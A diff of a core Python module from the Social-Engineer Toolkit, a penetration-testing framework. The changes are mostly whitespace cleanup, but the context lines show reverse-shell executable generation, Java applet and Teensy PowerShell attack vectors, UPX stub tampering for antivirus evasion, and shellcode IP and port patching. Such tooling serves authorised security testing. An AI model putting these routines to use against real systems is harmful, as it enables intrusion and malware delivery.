@@ -2,7 +2,7 @@
 ##############################################
 #
 # Centralized classes, work in progress
-# 
+#
 ##############################################
 import re
 import sys
@@ -72,7 +72,7 @@ if check_os() == "posix":
             self.backCyan = ''
             self.backWhite = ''
             self.DARKCYAN = ''
-                        
+
 # if we are windows or something like that then define colors as nothing
 else:
     class bcolors:
@@ -115,7 +115,7 @@ else:
             self.backWhite = ''
             self.DARKCYAN = ''
 
-# this will be the home for the set menus 
+# this will be the home for the set menus
 def setprompt(category, text):
     # if no special prompt and no text, return plain prompt
     if category == '0' and text == "":
@@ -148,7 +148,7 @@ def setprompt(category, text):
 
 def yesno_prompt(category,text):
     valid_response = False
-    while not valid_response: 
+    while not valid_response:
         response = raw_input(setprompt(category,text))
         response = str.lower(response)
         if response == "no" or response == "n":
@@ -225,10 +225,10 @@ class create_menu:
         print text
         #print "\nType 'help' for information on this module\n"
         for i, option in enumerate(menu):
-            
+
             menunum = i + 1
             # Check to see if this line has the 'return to main menu' code
-            match = re.search("0D", option) 
+            match = re.search("0D", option)
             # If it's not the return to menu line:
             if not match:
                 if menunum < 10:
@@ -410,7 +410,7 @@ def check_beautifulsoup():
                     subprocess.Popen("rm -rf BeautifulSoup-*", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
                     print_status("Finished... Relaunch SET, if it doesn't work for you, install manually.")
                     sys.exit(1)
-    
+
                 if answer == "NO":
                     sys.exit()
                 else:
@@ -455,7 +455,7 @@ def check_mssql():
             else:
                 print_error("ERROR:Invalid response, exiting the Social-Engineer Toolkit...")
                 sys.exit(1)
-# 
+#
 # cleanup old or stale files
 #
 def cleanup_routine():
@@ -503,7 +503,7 @@ def update_set():
 # Pull the help menu here
 #
 def help_menu():
-    fileopen = file("README","r").readlines()
+    fileopen = file("README.txt","r").readlines()
     for line in fileopen:
         line = line.rstrip()
         print line
@@ -573,7 +573,7 @@ def site_cloner(website, exportpath, *args):
 # inherit the AUTO_DETECT=ON or OFF configuration.
 #
 # usage: metasploit_reverse_tcp_exe(portnumber)
-# 
+#
 def meterpreter_reverse_tcp_exe(port):
 
     ipaddr = grab_ipaddress()
@@ -604,7 +604,7 @@ def meterpreter_reverse_tcp_exe(port):
     random_value = generate_random_string(5, 10)
     # copy the created executable to program_junk
     print_status("Executable created under src/program_junk/%s.exe" % (random_value))
-    subprocess.Popen("cp src/html/msf.exe src/program_junk/%s.exe" % (random_value), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait() 
+    subprocess.Popen("cp src/html/msf.exe src/program_junk/%s.exe" % (random_value), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
 #
 # Start a metasploit multi handler
 #
@@ -682,7 +682,7 @@ def java_applet_attack(website, port, directory):
     filename = check_options("MSF.EXE=")
     if check_options != 0:
     #if os.path.isfile("src/program_junk/rand_gen"):
-	  
+
 	# move the file to the specified directory and filename
 	subprocess.Popen("cp src/html/msf.exe %s/%s" % (directory,filename), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
 
@@ -719,7 +719,7 @@ def teensy_pde_generator(attack_method):
         filewrite = file("reports/powershell_down.pde", "w")
         teensy_string = ("Successfully generated Teensy HID Attack Vector under reports/powershell_down.pde")
 
-    # if we are doing the attack vector teensy 
+    # if we are doing the attack vector teensy
     if attack_method == "powershell_reverse":
         # specify the filename
         filename = file("src/teensy/powershell_reverse.pde", "r")
@@ -733,7 +733,7 @@ def teensy_pde_generator(attack_method):
         filewrite = file("reports/java_applet.pde", "w")
         teensy_string = ("Successfully generated Teensy HID Attack Vector under reports/java_applet.pde")
 
-    # if we are doing the attack vector teensy 
+    # if we are doing the attack vector teensy
     if attack_method == "wscript":
         # specify the filename
         filename = file("src/teensy/wscript.pde", "r")
@@ -758,7 +758,7 @@ def teensy_pde_generator(attack_method):
     print_status(teensy_string)
 #
 # Expand the filesystem windows directory
-# 
+#
 
 def windows_root():
     return os.environ['WINDIR']
@@ -768,7 +768,7 @@ def windows_root():
 #
 def log(error):
         # open log file only if directory is present (may be out of directory for some reason)
-        if not os.path.isfile("%s/src/logs/set_logfile.log" % (definepath)): 
+        if not os.path.isfile("%s/src/logs/set_logfile.log" % (definepath)):
                 filewrite = file("%s/src/logs/set_logfile.log" % (definepath), "w")
                 filewrite.write("")
                 filewrite.close()
@@ -792,7 +792,7 @@ def upx(path_to_file):
                 match = re.search("UPX_PATH=", line)
                 if match:
                         upx_path = line.replace("UPX_PATH=", "")
-        
+
         # if it isn't there then bomb out
         if not os.path.isfile(upx_path):
                 print_warning("UPX was not detected. Try configuring the set_config again.")
@@ -804,14 +804,14 @@ def upx(path_to_file):
                 subprocess.Popen("%s -9 -q -o src/program_junk/temp.binary %s" % (upx_path, path_to_file), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
                 # move it over the old file
                 subprocess.Popen("mv src/program_junk/temp.binary %s" % (path_to_file), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
-                
+
                 # random string
                 random_string = generate_random_string(3,3).upper()
 
                 # 4 upx replace - we replace 4 upx open the file
                 fileopen = file(path_to_file, "rb")
                 filewrite = file("src/program_junk/temp.binary", "wb")
-                
+
                 # read the file open for data
                 data = fileopen.read()
                 # replace UPX stub makes better evasion for A/V
@@ -831,9 +831,9 @@ def show_banner(define_version,graphic):
                 show_graphic()
         else:
                 os.system("clear")
-        
+
         print bcolors.BLUE + """
-  [---]        The Social-Engineer Toolkit ("""+bcolors.YELLOW+"""SET"""+bcolors.BLUE+""")         [---]        
+  [---]        The Social-Engineer Toolkit ("""+bcolors.YELLOW+"""SET"""+bcolors.BLUE+""")         [---]
   [---]        Created by:""" + bcolors.RED+""" David Kennedy """+bcolors.BLUE+"""("""+bcolors.YELLOW+"""ReL1K"""+bcolors.BLUE+""")         [---]
   [---]                 Version: """+bcolors.RED+"""%s""" % (define_version) +bcolors.BLUE+"""                   [---]
   [---]              Codename: '""" + bcolors.YELLOW + """Turbulence""" + bcolors.BLUE + """'              [---]
@@ -843,7 +843,7 @@ def show_banner(define_version,graphic):
 
 """ + bcolors.GREEN+"""     Welcome to the Social-Engineer Toolkit (SET). The one
       stop shop for all of your social-engineering needs.
-    """ 
+    """
         print bcolors.BLUE + """      Join us on irc.freenode.net in channel #setoolkit\n""" + bcolors.ENDC
         print bcolors.BOLD + """  The Social-Engineer Toolkit is a product of TrustedSec.\n\n           Visit: """ + bcolors.GREEN + """https://www.trustedsec.com\n""" + bcolors.ENDC
 
@@ -853,28 +853,28 @@ def show_graphic():
                 print bcolors.YELLOW + r"""
                          .--.  .--. .-----.
                         : .--': .--'`-. .-'
-                        `. `. : `;    : :  
-                         _`, :: :__   : :  
+                        `. `. : `;    : :
+                         _`, :: :__   : :
                         `.__.'`.__.'  :_;   """ + bcolors.ENDC
                 return
-    
+
         if menu == 3:
                 print bcolors.GREEN + r"""
                   _______________________________
                  /   _____/\_   _____/\__    ___/
-                 \_____  \  |    __)_   |    |   
-                 /        \ |        \  |    |   
-                /_______  //_______  /  |____|   
+                 \_____  \  |    __)_   |    |
+                 /        \ |        \  |    |
+                /_______  //_______  /  |____|
                         \/         \/            """ + bcolors.ENDC
                 return
-        
+
         if menu == 4:
-                print bcolors.BLUE + r"""                                               
+                print bcolors.BLUE + r"""
                     :::===  :::===== :::====
                     :::     :::      :::====
-                     =====  ======     ===  
-                        === ===        ===  
-                    ======  ========   ===  
+                     =====  ======     ===
+                        === ===        ===
+                    ======  ========   ===
 """ + bcolors.ENDC
 
         if menu == 5:
@@ -890,21 +890,21 @@ def show_graphic():
 
         if menu == 6:
                 print bcolors.PURPLE + r'''
-                 .M"""bgd `7MM"""YMM MMP""MM""YMM 
-                ,MI    "Y   MM    `7 P'   MM   `7 
-                `MMb.       MM   d        MM      
-                  `YMMNq.   MMmmMM        MM      
-                .     `MM   MM   Y  ,     MM      
-                Mb     dM   MM     ,M     MM      
+                 .M"""bgd `7MM"""YMM MMP""MM""YMM
+                ,MI    "Y   MM    `7 P'   MM   `7
+                `MMb.       MM   d        MM
+                  `YMMNq.   MMmmMM        MM
+                .     `MM   MM   Y  ,     MM
+                Mb     dM   MM     ,M     MM
                 P"Ybmmd"  .JMMmmmmMMM   .JMML.''' + bcolors.ENDC
                 return
-        
+
         if menu == 7:
-                print bcolors.YELLOW + r""" 
+                print bcolors.YELLOW + r"""
                       ________________________
                       __  ___/__  ____/__  __/
-                      _____ \__  __/  __  /   
-                      ____/ /_  /___  _  /    
+                      _____ \__  __/  __  /
+                      ____/ /_  /___  _  /
                       /____/ /_____/  /_/     """ + bcolors.ENDC
                 return
 
@@ -962,7 +962,7 @@ def set_check():
     for line in fileopen:
         match = re.search("SET_INTERACTIVE_SHELL=OFF", line)
         # if we turned it off then we return a true else return false
-        if match: 
+        if match:
             return True
         match1 = re.search("SET_INTERACTIVE_SHELL=ON", line)
         # return false otherwise
@@ -1019,7 +1019,7 @@ def check_length(choice,max):
                 choice = int(choice)
             # if everythings good return the right choice
             return choice
-        # oops, not a integer 
+        # oops, not a integer
         except Exception:
             counter = 1
 
@@ -1086,7 +1086,7 @@ def is_valid_ipv6(ip):
              |  (?<!:)              #
              |  (?<=:) (?<!::) :    #
              )                      # OR
-         |                          #   A v4 address with NO leading zeros 
+         |                          #   A v4 address with NO leading zeros
             (?:25[0-4]|2[0-4]\d|1\d\d|[1-9]?\d)
             (?: \.
                 (?:25[0-4]|2[0-4]\d|1\d\d|[1-9]?\d)
@@ -1131,7 +1131,7 @@ def copyfolder(sourcePath, destPath):
 
     #figure out where we're going
     dest = destPath + root.replace(sourcePath, '')
-    
+
     #if we're in a directory that doesn't exist in the destination folder
     #then create a new folder
     if not os.path.isdir(dest):
@@ -1155,7 +1155,7 @@ def copyfolder(sourcePath, destPath):
 # this routine will be used to check config options within the set.options
 def check_options(option):
     # open the directory
-    trigger = 0        
+    trigger = 0
     fileopen = file("%s/src/program_junk/set.options" % (definepath), "r").readlines()
     for line in fileopen:
         match = re.search(option, line)
@@ -1163,7 +1163,7 @@ def check_options(option):
             line = line.rstrip()
             line = line.replace('"', "")
             line = line.split("=")
-            return line[1] 
+            return line[1]
             trigger = 1
     if trigger == 0: return trigger
 
@@ -1178,7 +1178,7 @@ def update_options(option):
         filewrite = file("%s/src/program_junk/set.options" % (definepath), "a")
         filewrite.write(option + "\n")
         filewrite.close()
- 
+
 # python socket listener
 def socket_listener(port):
     port = int(port)          # needed integer for port
@@ -1330,7 +1330,7 @@ def shellcode_replace(ipaddr, port, shellcode):
 		# getting everything into the right format
 		if len(port) > 4:
 			port = "\\x00" + port
-		# if we are using a low number like 21, 23, etc. 
+		# if we are using a low number like 21, 23, etc.
 		if len(port) == 4:
 			port = "\\x00\\x00" + port
 		shellcode = shellcode.replace(r"\x00\x01\xbb", port)
